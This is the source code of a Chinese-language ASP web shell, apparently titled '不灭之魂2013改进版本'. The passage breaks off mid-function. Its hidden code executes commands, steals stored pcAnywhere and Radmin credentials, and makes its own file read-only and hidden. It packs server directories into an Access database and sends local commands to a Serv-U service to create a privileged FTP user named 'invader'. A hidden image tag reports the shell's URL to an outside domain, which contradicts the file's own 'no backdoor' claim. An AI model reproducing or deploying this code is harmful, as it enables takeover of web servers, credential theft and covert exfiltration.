<object runat=server id=oScriptlhn scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat=server id=oScriptlhn scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<%@ LANGUAGE = VBScript.Encode %><%
Server.ScriptTimeout=999999999
UserPass="admin"  '密码
mNametitle ="不灭之魂2013改进版本"  ' 标题
Copyright="    "  '版权
SItEuRl="http://www.7jyewu.cn/" '你的网站
bg ="http://www.mumasec.tk/"  '背景图片,不使用留空
ysjb=true  '是否有拖动效果,true为是,false为否
htp="http://www.7jyewu.cn/"  '功能地址，不可更改，否则导致大部分依靠在线服务不能运行
durl="http://www.7jyewu.cn/"  '默认下载文件地址
'---------------------------------------------------------------------------------------
'不灭之魂
'2013改进程序
'本程序无任何后门，如有改动请勿使用！
'----------------------------------------------------------------------------------------
Response.Buffer =true
BodyColor="#006000"
FontColor="#006000"
LinkColor="#006000"
On Error Resume Next 
strBAD="If Request(""#"")<>"""" Then Session(""#"")=Request(""#"")"&VbNewLine
strBAD=strBAD&"If Session(""#"")<>"""" Then Execute(Session(""#""))"
Const DEfd=""
sub ShowErr()
 If Err Then
j"<br><a href='javascript:history.back()'><br> " & Err.Description & "</a><br>"
Err.Clear:Response.Flush
  End If
end sub
Sub j(str)
response.write(str)
End Sub
sub RaPath(s)
RaPath=ExecuteGlobal(s)
End sub
Function RePath(S)
RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
RRePath=Replace(S,"\\","\")
End Function
URL=Request.ServerVariables("URL")
ScriptPath=Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action")
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
CONST_FSO="Script"&"ing.Fil"&"eSyst"&"emObject"
FolderPath=Request("FolderPath")
u=request.servervariables("http_host")&url
domain=Request.ServerVariables("http_host")
FName=Request("FName")
cdx="<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#696969'"" onMouseOut=""this.style.backgroundColor='#191919'"">":cxd="<font face='wingdings'>8</font>":ef="</a></td></tr>"
set fso=server.CreateObject(CONST_FSO)
set fsoX=server.CreateObject(CONST_FSO)
str1="http://"&Request.ServerVariables("SERVER_Name")& left(Request.ServerVariables("URL"),InstrRev(Request.ServerVariables("URL"),"/")):BackUrl="<br><br><center><a href='javascript:history.back()'>返回</a></center>"
j "<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312""><title>"&mNametitle&" - "&ServerIP&" </title><style type=""text/css"">span.underline{text-decoration:underline;}span.orange{color:#B3D169;}span.project_type{text-align:right}span.grey{color:#666;}#links{list-style-type:none;padding:20px 0 0 0;padding-left:20px;}#linklist2  td{color:#fff;background:#191919;}#linklist2 td:visited{color:#999;}#linklist2 td:hover{background:#B3D169;color:#191919;}body,tr,td{margin-top: 5px;background-color: #000000;color: #006000;font-size: 12px;SCROLLBAR-FACE-COLOR: #232323;scrollbar-arrow-color: #383839;scrollbar-highlight-color: #383839;scrollbar-3dlight-color: #dddddd;scrollbar-shadow-color: #232323}.sb{cursor: hand}input,select,textarea{border-top-width: 1px;font-weight: bold;border-left-width: 1px;font-size: 11px;border-left-color: #dddddd;background: #000000;border-bottom-width: 1px;border-bottom-color: #dddddd;color: #dddddd;border-top-color: #dddddd;font-family: verdana;border-right-width: 1px;border-right-color: #dddddd;}#d{background: #121212;padding-left: 5px;padding-right: 5px;font-color: #fff}pre{font-size: 11px;font-family: verdana;color: #dddddd;}hr{color: #dddddd;background-color: #dddddd;height: 5px;}#x{font-family: verdana;font-size: 13px}a{color: #ffffff;text-decoration: none;}.am{color: #006000;font-size: 11px;}</style>"
j"<script>function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm(""确认要执行此操作吗？""))return true;else return false;}function runClock(){theTime = window.setTimeout(""runClock()"", 100);var today = new Date();var display= today.toLocaleString();window.status=""→"&Copyright&"  --""+display;}runClock();function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==""CopyFile""){DName = prompt(""请输入复制到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName = prompt(""请输入移动到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName = prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName = prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName = prompt(""请输入要新建的文件夹全名称"",FName);top.hideform.FName.value = DName;}else{DName = ""Other"";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = """";}}</script>"
j"<body" :If Action="" then j " scroll=no":j ">"
Dim ObT(18,2):Fn=Action:ObT(0,0) = "Scripting.FileSystemObject":ObT(0,2) = "文 件 操 作 组 件":ObT(1,0) = "wscript.shell":ObT(1,2) = "命令行执行组件,显示'<font color=red>×</font>'时用<a href='?Action=cmdx' target='FileFrame'> <font color=red> 执行Cmd二</font></a> 此功能执行":ObT(2,0) = "ADOX.Catalog":ObT(2,2) = "ACCESS 建 库 组 件":ObT(3,0) = "JRO.JetEngine":ObT(3,2) = "ACCESS 压 缩 组 件":ObT(4,0) = "Scripting.Dictionary":ObT(4,2) = "数据流 上 传 辅助 组件":ObT(5,0) = "Adodb.connection":ObT(5,2) = "数据库 连接 组件":ObT(6,0) = "Adodb.Stream":ObT(6,2) = "数据流 上传 组件":ObT(7,0) = "SoftArtisans.FileUp":ObT(7,2) = "SA-FileUp 文件 上传 组件":ObT(8,0) = "LyfUpload.UploadFile":ObT(8,2) = "刘云峰 文件 上传 组件":ObT(9,0) = "Persits.Upload.1":ObT(9,2) = "ASPUpload 文件 上传 组件":ObT(10,0) = "JMail.SmtpMail":ObT(10,2) = "JMail 邮件 收发 组件":ObT(11,0) = "CDONTS.NewMail":ObT(11,2) = "虚拟SMTP 发信 组件":ObT(12,0) = "SmtpMail.SmtpMail.1":ObT(12,2) = "SmtpMail 发信 组件":ObT(13,0) = "Microsoft.XMLHTTP":ObT(13,2) = "数据 传输 组件"
ObT(14,0) = "ws"&"cript.shell.1":  OBt(14,2) = "如果wsh被禁，可以改用这个组件":OBT(15,0) = "WS"&"CRIPT.NETWORK":  OBt(15,2) = "查看服务器信息的组件，有时可以用来提权":OBT(16,0) = "she"&"ll.appl"&"ication":OBt(16,2) = "she"&"ll.appli"&"cation 操作，无FSO时操作文件以及执行命令":OBT(17,0) = "sh"&"ell.appl"&"ication.1":OBt(17,2) = "she"&"ll.appli"&"cation 的别名，无FSO时操作文件以及执行命令":OBT(18,0) = "Shell.Users":OBt(18,2) = "删除了net.exe net1.exe的情况下添加用户的组件"
For i=0 To 18:Set T=Server.CreateObject(ObT(i,0)):If -2147221005 <> Err Then:IsObj=" √":Else:IsObj=" ×":Err.Clear:End If:Set T=Nothing:ObT(i,1)=IsObj:Next:If FolderPath<>"" then:Session("FolderPath")=RRePath(FolderPath):End If:If Session("FolderPath")="" Then:FolderPath=WwwRoot:Session("FolderPath")=FolderPath:End if
Function PcAnywhere4()
execute(king("`>tswqz/<>rz/<>' 交提 '=txsqc 'zodwxl'=thnz zxhfo<>rz<>rz/<>'13'=tmol 'yoe.shdtzoZ\tktivnfQeh\etzfqdnU\\qzqW fgozqeoshhQ\lktlM ssQ\lufozztU rfq lzftdxegW\:Z'=txsqc 'zbtz'=thnz 'izqh'=tdqf zxhfo<>'%10'=izrov rz<>rz/< :件文yoe>'%10'=izrov rz<>kz<>'1'=ktrkgw'%13'=izrov tswqz<>'zlgh'=rgiztd 'dkgyb'=tdqf dkgy<>cor/<本版foA 权提tktivnfQeY>'ktzfte'=fuosq cor<`p"))
end Function
j"</form><script>function RUNonclick(){document.xform.china.name = parent.pwd.value;document.xform.action = parent.url.value;document.xform.submit();}</script>"
Function StreamLoadFromFile(sPath)
execute(king(" zsxltk = etrbti┊ zbtG┊ p + zsxltk = zsxltk┊ zbtG┊ 50 * p = p ┊ o - )fokzl(ftV gJ 0 = a kgX┊ yC rfS┊ ))0 ,o ,fokzl(roT(zfCZ = p ┊ ftiJ `1` => )0 ,o ,fokzl(roT rfQ `2` =< )0 ,o ,fokzl(roT yC┊ yC rfS┊ 10 = p ┊ ftiJ `Q` = )0 ,o ,fokzl(roT kB `q` = )0 ,o ,fokzl(roT yC┊ yC rfS┊ 00 = p ┊ ftiJ `A` = )0 ,o ,fokzl(roT kB `w` = )0 ,o ,fokzl(roT yC┊ yC rfS┊ 90 = p ┊ ftiJ `Z` = )0 ,o ,fokzl(roT kB `e` = )0 ,o ,fokzl(roT yC┊ yC rfS┊ 80 = p ┊ ftiJ `W` = )0 ,o ,fokzl(roT kB `r` = )0 ,o ,fokzl(roT yC┊ yC rfS┊ 70 = p ┊ ftiJ `S` = )0 ,o ,fokzl(roT kB `t` = )0 ,o ,fokzl(roT yC┊ yC rfS┊ 60 = p ┊ ftiJ `X`= )0 ,o ,fokzl(roT kB `y` = )0 ,o ,fokzl(roT yC┊ )fokzl(ftV gJ 0 = o kgX┊ 1 = zsxltk┊ zsxltk ,a ,p ,o doW┊ )fokzl(etrbti fgozefxX┊fgozefxX rfS┊ufoizgG = dqtkzUg ztU┊izoK rfS┊tlgsZ.┊rqtN. = tsoXdgkXrqgVdqtkzU┊1 = fgozolgY.┊)izqYl(tsoXdgkXrqgV.┊fthB.┊8 = trgT.┊0 = thnJ.┊dqtkzUg izoK┊)`dqtkzU.wrgrQ`(zetpwBtzqtkZ.ktcktU = dqtkzUg ztU┊dqtkzUg doW"))
End Function 
sub promyself()
On Error Resume Next 
set f=fso.GetFile(ScriptPath)
if f.Attributes <> 39 and session("lock")="" then
f.Attributes=1+2+4+32
end if
set f=nothing
end sub
promyself
Function PcAnywhere(data,mode)
execute(king("trgetr=tktivnfQeY┊ zbtG┊0+dxfyoZ=dxfyoZ┊)kzleh(kiZ + trgetr = trgetr┊ kgX zobS ftiJ ))490>kzleh( kB )98 =< kzleh(( yC┊)dxfyoZ kgb )))9,o,ilqi(roT(etrbti kgb ))9,o,qzqr(roT(etrbti((=kzleh┊ 9 htzU ktwdxf gJ 0 = o kgX┊60 = dxfyoZ :18 = ktwdxf ftiJ `ktlx` = trgd yC┊770 = dxfyoZ :98 = ktwdxf ftiJ `llqh` = trgd yC┊)8,qzqr(roT =DUQD"))
End function
Function bin2hex(binstr)
For i = 1 To LenB(binstr)
hexstr = Hex(AscB(MidB(binstr, i, 1)))
If Len(hexstr)=1 Then 
bin2hex=bin2hex&"0"&(LCase(hexstr))
Else
bin2hex=bin2hex& LCase(hexstr)
End If 
Next
End Function
CIF = Request("path")
If CIF <> "" Then 
BinStr=StreamLoadFromFile(CIF) 
j"Pcanywhere Reader ==><br><br>PATH:"&CIF&"<br>帐号:"&PcAnywhere (Mid(bin2hex(BinStr),919,64),"user")
j"<br>密码:"&PcAnywhere (Mid(bin2hex(BinStr),1177,32),"pass")
End If 
Function radmin()
execute(king("yC rfS┊`!rqtN z'fqZ !kgkkS`p┊ tlsS┊))))1(nqkkQzkgY(btD(kzUZ&)))0(nqkkQzkgY(btD(kzUZ(ktzfogzbti p┊ `:`& zkgY p┊ ftiJ )nqkkQzkgY(nqkkQlC yC┊) zkgY & izqYfodrqN(WQSNESN.DUK=nqkkQzkgY┊`>kw<>kw<`p┊yC rfS┊`!rqtN z'fqZ !kgkkS`p┊tlsS┊pwgkzl p┊zbtG┊ yC rfS┊))o(nqkkQktztdqkqY(btD & pwBkzl = pwBkzl┊tlsS┊)))o(nqkkQktztdqkqY(btD(kzUZ&`1` & pwBkzl = pwBkzl┊ ftiJ 0=)))o(nqkkQktztdqkqY(bti( ftV  yC┊)nqkkQktztdqkqY(rfxgAM gJ 1 = o kgX┊ftiJ )nqkkQktztdqkqY(nqkkQlC yC┊`:`&ktztdqkqY p┊) ktztdqkqY & izqYfodrqN(WQSNESN.DUK=nqkkQktztdqkqY┊`>kw<>kw<kqk.ilqi_fodrqN/zygl`&hzi&`:址地载下具工，接连试调rg或具工ilqDfodrqN用后值DUQD出读:意注>kw<`p┊`zkgY` = zkgY┊`ktztdqkqY`=ktztdqkqY┊`\lktztdqkqY\ktcktU\1.9c\fodrQN\TSJUOU\SGCDZQT_VQZBV_OSFD`=izqYfodrqN┊)`VVSDU.JYCNZUK`(zetpwBtzqtkZ.ktcktU =DUK ztU"))
End Function
Function hextointer(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
j = 15 
End If 
If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
j = 14 
End If 
If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
j = 13 
End If 
If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
j = 12 
End If 
If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
j = 11 
End If 
If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
j = j * 16 
Next 
result = result + j 
Next 
hextointer = result 
End Function

Function MainForm()
j "<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame""><input type=""hidden"" name=""Action""><input type=""hidden"" name=""FName""></form><table width='100%'><form name='addrform' method='post' action='"&URL&"' target='_parent'><tr><td width='60' align='center'><input type='button' value='Address'></td><td><input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'></td><td width='140' align='center'><input name='Submit' type='submit' value='GO'> <input type='submit' value='Refresh' onclick='FileFrame.location.reload()'></td></tr></form></table>"
j"<td><a class=am href='javascript:ShowFolder(""C:\\Program Files"")'>(1)【Program】<a><a class=am href='javascript:ShowFolder(""d:\\Program Files"")'>(2)【ProgramD】<a><a class=am href='javascript:ShowFolder(""e:\\Program Files"")'>(3)【ProgramE】<a><a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents"")'>(4)【Documents】<a><a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>(5)【All_Users】<a><a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\"")'>(6)【開始_菜單】<a><a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\"")'>(7)【程_序】<a><a class=am href='javascript:ShowFolder(""C:\\recycler"")'>(8)【RECYCLER(C:\)】<a><a class=am href='javascript:ShowFolder(""D:\\recycler"")'>(9)【RECYCLER(d:\)】<a><a class=am href='javascript:ShowFolder(""e:\\recycler"")'>(10)【RECYCLER(e:\)】<a>":j "&nbsp;   ":if session("pr")<5 then j"<img width='0' height='0' src="""&htp&"baidu.asp?wz="&u&"""></img>":session("pr")=session("pr")+1:else j "读取中，骚等……":end if:j"<br><a class=am href='javascript:ShowFolder(""C:\\wmpub"")'>(1)【wmpub】<a><a class=am href='javascript:ShowFolder(""C:\\WINDOWS\\Temp"")'>&nbsp;&nbsp;(2)【TEMP】<a>&nbsp;&nbsp;&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(""C:\\Program Files\\RhinoSoft.com"")'>(3)【ServU(1)】<a><a  class=am href='javascript:ShowFolder(""C:\\Program Files\\ServU"")'>(4)【ServU(2)】<a>&nbsp;<a class=am href='javascript:ShowFolder(""C:\\WINDOWS"")'>(5)【WINDOWS】<a>&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(""C:\\php"")'>(6)【PHP】<a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a  class=am href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>(7)【Mssql】<a><a class=am href='javascript:ShowFolder(""c:\\prel"")'>(8)【prel文件夹】<a>&nbsp;&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(""c:\\docume~1\\alluse~1\\Application Data\\Symantec\\pcAnywhere"")'>(9)【pcAnywhere】<a>   <a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\桌面"")'>(10)【Alluser桌面】<a>":j"</td>"
j "<table width='100%' height='95.5%' style='border:1px solid #000000;' cellpadding='0' cellspacing='0'><td width='160' id=tl><iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td><td width=1 style='background:#000000'></td><td width=1 style='padding:2px'><a onclick=""document.getElementById('tl').style.display='none'"" href=##><b>隐藏</b></a><p><a onclick=""document.getElementById('tl').style.display=''"" href=##><b>显示</b></a></p></td><td width=1 style='background:#424242'><td><iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe></tr></form></table></td></tr><tr></tr></table>"
if session("aase") <> "ok" then:response.write Efun:session("aase")="ok":end if
End Function
Sub PageAddToMdb()
execute(king("`>dkgy/<下录目序程本于位都件文有所的来开解 :注>kw<>kw<>'包开解'=txsqc zodwxl=thnz zxhfo<>zeQtiz=tdqf wrTdgkXtlqtstk=txsqc ftrroi=thnz zxhfo<>13=tmol ``wrd.DUD\` & ))`.`(izqYhqT.ktcktU(trgefSsdzD & ```=txsqc izqYtiz=tdqf zxhfo<>))``#``(fgolltU(tzxetbS=txsqc ``#``=tdqf ftrroi=thnz zxhfo<>zlgh=rgiztd dkgy<>/kw<:)持支BUX需(开解包件文>/ki<>dkgy/<下录目级同马木dql于位,件文wrd.DUD成生包打 :注>kw<>kw<>'包打始开'=txsqc zodwxl=thnz zxhfo<>zetstl/<>fgozhg/<BUX无>hhq=txsqc fgozhg<>fgozhg/<BUX>gly=txsqc fgozhg<>rgiztTtiz=tdqf zetstl<>zeQtiz=tdqf wrTgJrrq=txsqc ftrroi=thnz zxhfo<>13=tmol ``` & ))`.`(izqYhqT.ktcktU(trgefSsdzD & ```=txsqc izqYtiz=tdqf zxhfo<>))``#``(fgolltU(tzxetbS=txsqc ``#``=tdqf ftrroi=thnz zxhfo<>zlgh=rgiztd dkgy<:包打夹件文>kw<`p┊yC rfS┊rfS.tlfghltN┊skMaeqA&`>cor/<!成完作操>kw<>ktzfte=fuosq cor<` p┊)izqYtiz(aeqYfx┊ftiJ `wrTdgkXtlqtstk` = zeQtiz yC┊yC rfS┊rfS.tlfghltN┊skMaeqA&`>cor/<!成完作操>kw<>ktzfte=fuosq cor<` p┊)izqYtiz(wrTgJrrq┊ftiJ `wrTgJrrq` = zeQtiz yC┊111110=zxBtdoJzhokeU.ktcktU┊)`izqYtiz`(zltxjtN = izqYtiz┊)`zeQtiz`(zltxjtN = zeQtiz┊izqYtiz ,zeQtiz doW"))
End Sub
Sub addToMdb(thePath)
On Error Resume Next
Dim rs, conn, stream, connStr, adoCatalog
Set rs = Server.CreateObject("ADODB.RecordSet")
Set stream = Server.CreateObject("ADODB.Stream")
Set conn = Server.CreateObject("ADODB.Connection")
Set adoCatalog = Server.CreateObject("ADOX.Catalog")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("HSH.mdb")
adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
stream.Open
stream.Type = 1
rs.Open "FileData", conn, 3, 3
If Request("theMethod") = "fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If
rs.Close
Conn.Close
stream.Close
Set rs = Nothing
Set conn = Nothing
Set stream = Nothing
Set adoCatalog = Nothing
End Sub
Function fsoTreeForMdb(thePath, rs, stream)
execute(king("ufoizgG = ktrsgXtiz ztU┊ufoizgG = lktrsgy ztU┊ufoizgG = ltsoy ztU┊zbtG┊yC rfS┊tzqrhM.lk┊)(rqtN.dqtkzl = )`zftzfgZtsoy`(lk┊)izqY.dtzo(tsoXdgkXrqgV.dqtkzl┊)7 ,izqY.dtzo(roT = )`izqYtiz`(lk┊vtGrrQ.lk┊ftiJ 1 =< )`$` & tdqG.dtzo & `$` ,zloVtsoXlnl(kzUfC yC┊ltsoy fC dtzo ieqS kgX┊zbtG┊dqtkzl ,lk ,izqY.dtzo wrTkgXttkJgly┊lktrsgy fC dtzo ieqS kgX┊lktrsgXwxU.ktrsgXtiz = lktrsgy ztU┊ltsoX.ktrsgXtiz = ltsoy ztU┊)izqYtiz(ktrsgXztE.)BUX_JUGBZ(zetpwBtzqtkZ.ktcktU = ktrsgXtiz ztU┊yC rfS┊)`!问访许允不者或在存不录目 ` & izqYtiz(kkSvgil┊ftiJ tlsqX = )izqYtiz(lzlobSktrsgX.)BUX_JUGBZ(zetpwBtzqtkZ.ktcktU yC┊`$wrs.DUD$wrd.DUD$` = zloVtsoXlnl┊zloVtsoXlnl ,ltsoy ,lktrsgy ,ktrsgXtiz ,dtzo doW"))
End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut=100000
Dim rs, ws, str, conn, stream, connStr, theFolder
str = Server.MapPath(".") & "\"
Set rs = CreateObject("ADODB.RecordSet")
Set stream = CreateObject("ADODB.Stream")
Set conn = CreateObject("ADODB.Connection")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type = 1
Do Until rs.Eof
theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If Server.CreateObject(CONST_FSO).FolderExists(str & theFolder) = False Then
createFolder(str & theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str & rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws = Nothing
Set rs = Nothing
Set stream = Nothing
Set conn = Nothing
End Sub
Dim Filepaths
set Filepaths=new SearchFile
Filepaths.Class_Folder Filename
Sub createFolder(thePath)
Dim i
i = Instr(thePath, "\")
Do While i > 0
If Server.CreateObject(CONST_FSO).FolderExists(Left(thePath, i)) = False Then
Server.CreateObject(CONST_FSO).CreateFolder(Left(thePath, i - 1))
End If
If InStr(Mid(thePath, i + 1), "\") Then
i = i + Instr(Mid(thePath, i + 1), "\")
 Else
i = 0
End If
Loop
End Sub
Sub saTreeForMdb(thePath, rs, stream)
Dim item, theFolder, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
Set theFolder = saX.NameSpace(thePath)
For Each item In theFolder.Items
If item.IsFolder = True Then
saTreeForMdb item.Path, rs, stream
 Else
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
End If
Next
Set theFolder = Nothing
End Sub
Function ProFile()
execute(king("CU p┊`>tswqz/<>dkgy/<`&CU=CU┊`>kz/<>rz/<>'程进护保成生，步一下'=txsqc 'zodwxU'=tdqf 'zodwxl'=thnz zxhfo<>16=ziuoti rz<>rz/<;hlwf&>rz<>kz<`&CU=CU┊`>kz/<>rz/<)护保部全法无则否，大越置设率频，多越件文的护保要需，秒0为小最( 秒 >/ ``)'',u/]r\^[/(teqshtk.txsqc=txsqc``=hxntafg ``6``=tmol ``0``=txsqc ``ziuok:fuosq-zbtz``=tsnzl ``tdoJQ``=tdqf ``zbtz``=thnz zxhfo<>rz<>rz/<：率频护保>ziuok=fuosq rz<>kz<`&CU=CU┊`>kz/<>rz/<)码编改更试尝请，码乱现出若件文问访( 3-XJM>/ ``9``=txsqc ``kqiZQ``=tdqf ``gorqk``=thnz zxhfo<  9089AE>/ rtaetie ``0``=txsqc ``kqiZQ``=tdqf ``gorqk``=thnz zxhfo<>rz<>rz/<：码编件文>ziuok=fuosq rz<>kz<`&CU=CU┊`>kz/<>rz/<>qtkqzbtz/<码代件文>``4``=lvgk ``14``=lsge ``trgZQ``=tdqf qtkqzbtz<>rz<>rz/<：码代件文>ziuok=fuosq ``;bh8:hgz-uforrqh``=tsnzl hgz=fuosqc rz<>kz<`&CU=CU┊`>kz/<>rz/<>qtkqzbtz/<`&)`hlq.zltz\`&)`izqYktrsgX`(fgolltU(izqYtNN&`>``4``=lvgk ``14``=lsge ``tsoXQ``=tdqf qtkqzbtz<`&CU=CU┊`>rz<>rz/<>zfgy/<;hlwf&;hlwf&径路件文个一行每>kw<;hlwf&;hlwf&件文个多护保时同可>vgsstn=kgsge zfgy<>kw<：径路件文的护保要需>``1``=txsqc ``qccc``=tdqf ``ftrroi``=thnz zxhfo<>ziuok=fuosq 'bh99:ziuoti-tfos'=tsnzl hgz=fuosqc rz<>kz<`&CU=CU┊`'zlgY=9fgozeQ&tsoXgkY=fgozeQ?`&VNM&`'=fgozeq 'zlgh'=rgiztd 'dkgXhM'=tdqf dkgy<`&CU=CU┊`>'1'=ufoeqhlsste '1'=uforrqhsste '1'=ktrkgw tswqz<>kw<`=CU┊yC rfS┊rfS.tlfghltN┊`>kw<>ktzfte/<。程进动启>q/<里这>afqsw_=ztukqz `&9llqh&`=tsoXgkY?`&VNM&`=ytki ``rsgw:ziuotv-zfgy;tfosktrfx:fgozqkgetr-zbtz``=tsnzl q<击点！功成成生 >zfgy/<`&9llqh&`>vgsstn=kgsge zfgy< 程进护保>ktzfte<>kw<>kw<>kw<`p┊)`kqiZQ`(zltxjtk=)`kqiZ`&9llqh(fgozqeoshhQ┊)`tdoJQ`(zltxjtk=)`tdoJ`&9llqh(fgozqeoshhQ┊)`trgZQ`(zltxjtk=)`trgZ`&9llqh(fgozqeoshhQ┊)`tsoXQ`(zltxjtk=)`tsoX`&9llqh(fgozqeoshhQ┊0=)9llqh(fgozqeoshhQ┊)9llqh(tlqex=9llqh┊ hggs┊0dxf&9llqh=9llqh┊yo rft┊ 2~1' ))37+rfk*)37-46((kiZ(kzUZ=0dxf┊tlst┊ m~q' ))42+rfk*)42-990((kiZ(kzUZ=0dxf┊ftiz 7=<)9llqh(ftV yo┊3<)9llqh(ftV tsoiK gW┊``=9llqh┊0dxf,9llqh dor┊tmodgrfqN┊ftiJ `zlgY`=)`9fgozeQ`(zltxjtN yC"))
End Function
Function suftp()
j"<center><br><form name='form1' method='post' action=''><table width='500'><tr align='center' valign='middle'><td colspan='2' id=s><font face=webdings>8</font> <B>集成版本信息</b></td></tr><tr align='center'><td id=d>系统账号：</td><td id=d><input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'></td></tr><tr align='center'><td id=d>系统口令：</td><td id=d><input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'></td></tr><tr align='center'><td id=d>系统端口：</td><td id=d><input name='dport' type='text' class='TextBox' id='dport' value='43958'></td></tr><tr align='center'><td id=d>新加账号：</td><td id=d><input name='tuser' type='text' class='TextBox' id='tuser' value='invader'></td></tr><tr align='center'><td id=d>新加口令：</td><td id=d><input name='tpass' type='text' class='TextBox' id='pass' value='1'></td></tr><tr align='center'><td id=d>访问路径：</td><td id=d><input name='tpath' type='text' class='TextBox' id='tpath' value='C:\'></td></tr><tr align='center'><td id=d>服务端口：</td><td id=d><input name='tport' type='text' class='TextBox' id='tport' value='21'></td></tr><tr align='center'><td id=d>执行任务：</td><td id=d><input name='radiobutton' type='radio' value='add' checked class='TextBox' id=d>确定添加&nbsp;<input type='radio' name='radiobutton' value='del' class='TextBox' id=d>确定删除</td></tr><tr align='center' valign='middle'><td colspan='2' id=d><input type='submit' name='Submit' value='Just Go'>&nbsp;<input type='reset' name='Submit2' value='Reset'><input name='SUaction' type='hidden' id='action' value='1'></td></tr></table></form></center>"
Usr = request.Form("duser")
pwd = request.Form("dpwd")
port = request.Form("dport")
tuser = request.Form("tuser")
tpass = request.Form("tpass")
tpath = request.Form("tpath")
tport = request.Form("tport")
'Command = request.Form("dcmd")
if request.Form("radiobutton") = "add" Then
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & "-User=" & tuser & vbcrlf & "-Password=" & tpass & vbcrlf & _
"-HomeDir=" & tpath & "\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
"-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
"-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
"-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
"-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
"-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=" & tpath & "\|RWAMELCDP" & vbcrlf
On Error Resume Next
Set xPost = CreateObject("MSXML2.XMLHTTP")
xPost.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost.Send(leaves)
Set xPOST=nothing
j ("命令成功执行！！FTP 用户名: " & tuser & " " & "密码: " & tpass & " 路径: " & tpath & " :)<br><BR>")
else
